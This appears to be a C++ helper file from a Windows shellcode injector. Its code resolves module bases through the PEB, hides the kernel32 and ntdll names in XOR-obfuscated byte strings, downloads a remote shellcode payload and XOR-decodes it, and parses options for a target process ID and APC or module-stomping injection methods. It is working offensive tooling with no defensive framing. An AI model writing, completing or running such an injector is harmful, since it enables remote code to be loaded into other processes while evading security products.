

#include "helper.hpp"
#include "def.h"


helper helperHandler;


    unsigned long helper::simpleHash(const std::string& input) {
        unsigned long hash = 5381; // initial seed

        for (char c : input) {
            hash = ((hash << 5) + hash) + c;
            // hash * 33 + c (classic DJB2 style)
        }

        return hash;
    }
    PVOID helper::GetModuleBase(const wchar_t* moduleName)
    {
        PPEB pPeb = (PPEB)__readgsqword(0x60); // PEB x64 offset
        PPEB_LDR_DATA ldr = pPeb->Ldr;
        for (PLIST_ENTRY entry = ldr->InMemoryOrderModuleList.Flink;
            entry != &ldr->InMemoryOrderModuleList;
            entry = entry->Flink)
        {
            LDR_DATA_TABLE_ENTRY* mod = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
            if (_wcsicmp(mod->BaseDllName.Buffer, moduleName) == 0)
                return mod->DllBase;
        }
        return NULL;
    }
    void helper::xor_decode(char* data, int len, char key) {
        for (int i = 0; i < len; i++) {
            data[i] ^= key;
        }
    }

    void helper::xor_shellcode(unsigned char* data, int len, unsigned char shellcode_key) {
        for (int i = 0; i < len; i++) {
            data[i] ^= shellcode_key;
        }

    }



    unsigned char* helper::getKernel32() {
        static unsigned char k[] = {
            0xC1, 0xCF, 0xD8, 0xC4, 0xCF, 0xC6, 0x99, 0x98,
            0x84, 0xCE, 0xC6, 0xC6, 0x00
        };

        static bool decoded = false;

        if (!decoded) {
            helper::xor_decode((char*)k, sizeof(k) - 1, 0xAA);
            decoded = true;
        }

        return k;
    }

    unsigned char* helper::getNtdll() {
        static unsigned char k[] = {
            0xC4, 0xDE, 0xCE, 0xC6, 0xC6, 0x84, 0xCE, 0xC6,
            0xC6, 0x00
        };

        static bool decoded = false;

        if (!decoded) {
            helper::xor_decode((char*)k, sizeof(k) - 1, 0xAA);
            decoded = true;
        }


        return k;
    };

    std::vector<unsigned char> helper::fetchRemoteShellcodeAndDecode(const std::wstring& url, const std::wstring& file, unsigned char shellcode_key)
    {
		std::cout << "-------In fetchRemoteShellcodeAndDecode function-------\n";
		std::wcout << "downloading shellcode from url: " << std::wstring(url) << " and file: " << std::wstring(file) << "\n";
        std::vector<unsigned char> rep = DownloadBinary(url, file);
		std::cout << "decoding shellcode with key : " << shellcode_key << "\n";
        helper::xor_shellcode(rep.data(), (int)rep.size(), shellcode_key);
		std::cout << "-------Exiting fetchRemoteShellcodeAndDecode function-------\n";
        return rep;
    }
    void helper::printHelp(const char* programName) {
        std::cout <<
            "Usage:\n"
            << programName << " --pid <pid> --method <apc|stomp> [options]\n\n"
            "Options:\n"
            "  --pid <int>            Target process id\n"
            "  --method <string>      apc | stomp\n"
            "  --key <hex>            XOR key (default 0x67)\n"
            "  --remote <url>         Remote host (google.com)\n"
            "  --file <path>          Remote file (/payload.bin)\n"
            "  --help                 Show this help\n";
    }



    helper::Options helper::parseArgs(int argc, char* argv[]) {
        helper::Options opt;

        for (int i = 1; i < argc; i++) {
            std::string arg = argv[i];

            if (arg == "--help") {
                helperHandler.printHelp(argv[0]);
                exit(0);
            }

            else if (arg == "--pid" && i + 1 < argc) {
                opt.pid = std::stoi(argv[++i]);
            }

            else if (arg == "--method" && i + 1 < argc) {
                opt.method = argv[++i];
            }

            else if (arg == "--key" && i + 1 < argc) {
                opt.key = static_cast<unsigned char>(std::stoi(argv[++i], nullptr, 0));
            }

            else if (arg == "--remote" && i + 1 < argc) {
                opt.useRemote = true;
                std::string tmp = argv[++i];
                opt.url = std::wstring(tmp.begin(), tmp.end());
            }

            else if (arg == "--file" && i + 1 < argc) {
                std::string tmp = argv[++i];
                opt.file = std::wstring(tmp.begin(), tmp.end());
            }
        }

        return opt;
    }